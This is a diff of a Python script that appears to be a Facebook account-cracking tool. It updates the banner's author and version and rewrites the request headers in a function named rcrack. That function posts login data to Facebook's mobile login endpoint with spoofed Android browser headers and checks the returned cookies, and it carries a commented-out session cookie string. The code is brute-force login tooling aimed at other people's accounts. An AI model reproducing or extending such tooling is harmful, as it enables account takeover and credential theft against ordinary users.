@@ -294,12 +294,12 @@ logo=(f"""
 ::    :    :   : :   : :::    : :: ::   : :: ::   :: : ::   
 __________________________________________________
 
- \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:NK\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
+ \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:NAJEEB\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
 ──────────────────────────────────────────────────
 \033[1;92m Owner   :            MR:NAJEEB
 \033[1;92m Facebook:            Mr:NAJEEB
 \033[1;92m Github  :            Mr-NAJEEB
-\033[1;92m Version :            0.0.1
+\033[1;92m Version :            0.0.2
 ──────────────────────────────────────────────────""")
 #__________________MAIN____________#
 def linex():
@@ -881,22 +881,23 @@ def rcrack(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
-        # 'cookie': 'datr=8ijgZZW-XSE3aVtZoJ8sjwNY; sb=8ijgZeTTT635JWa0MaureNQ9; m_pixel_ratio=1.891728162765503; wd=572x1159; fr=0AQvmrdEQPAyqrDeb..Bl4Cjy..AAA.0.0.Bl4CkE.AWX0E58b8C0',
-           'dpr': '2.2250001430511475',
-           'sec-ch-prefers-color-scheme': 'dark',
-           'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-           'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-           'sec-ch-ua-mobile': '?1',
-           'sec-ch-ua-model': '"SOV43"',
-           'sec-ch-ua-platform': '"Android"',
-           'sec-ch-ua-platform-version': '"12.0.0"',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'none',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-           'viewport-width': '980',}
+            # 'cookie': 'datr=aVngZXvXxQWb3RdI0rD-DNvZ; sb=aVngZZd4vufwcFbLzteeQA01; m_pixel_ratio=1.891728162765503; ps_l=0; ps_n=0; zsh=ASRen33Xi4RNm29f8NvRy8q3AKj61mmpvqkXn0ZdEA9NC9HJwzFTUMEwqFUmNeDRVmvcjxnBs7raJXA0s5KnbTda1_lIZOGiRnyFA5a9zAaidhaYGwc5CvX6WlFDoggxfdDwl-tkZbCCNGm4h7iKcby84VBkpTtgALLga2NTLGR5YOs1D1I2o45SmurVRkvnDlXI1_a2N59-ytxMeidXidcQTS9Xekhb09hNKyaNUAlFjUQLqgw_oDl4a_J-KgD7srPcaUb0e5B7vbfA-yY0DR0tEhUM1srKuWpxyW8V3XzM-tqRsrV06jYbPGLzsRdvQ8SR; locale=en_US; wl_cbv=v2%3Bclient_version%3A2419%3Btimestamp%3A1709202111; vpd=v1%3B985x486x1.891728162765503; wd=572x1159; fr=0M6BOZ7kqPYALT9Oz.AWW1QEFd4t0AqVp-sctKBUfXYTY.Bl4Flp..AAA.0.0.Bl4FsT.AWXMTrW3CgU',
+            'dpr': '2.2250001430511475',
+            'referer': 'https://m.facebook.com/bookmarks/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"SOV43"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '980',}
 
             lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
